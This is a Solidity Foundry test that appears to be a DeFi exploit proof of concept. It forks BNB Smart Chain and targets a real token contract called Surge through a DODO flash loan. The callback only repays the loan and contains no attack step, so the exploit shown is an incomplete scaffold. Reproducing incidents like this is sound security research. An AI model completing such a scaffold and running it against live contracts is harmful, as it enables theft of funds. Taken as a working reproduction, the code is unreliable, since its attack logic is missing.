// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    address constant dodo = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;
    address public constant Surge_Address = 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 borrow_wbnb = 2 * 1e18;
    function setUp() public {
        cheats.createSelectFork("bsc", 37384900);
    }

    function testExploit() public {
        deal(address(Surge_Address),0);
        deal(address(this),0);
        emit log_named_decimal_uint("[Begin] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
        bytes memory data = abi.encode(dodo, address(WBNB), borrow_wbnb);
        DVM(dodo).flashLoan(0, borrow_wbnb, address(this),data);

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {

        // repay wbnb
        WBNB.transfer(address(dodo),borrow_wbnb);
    }
}


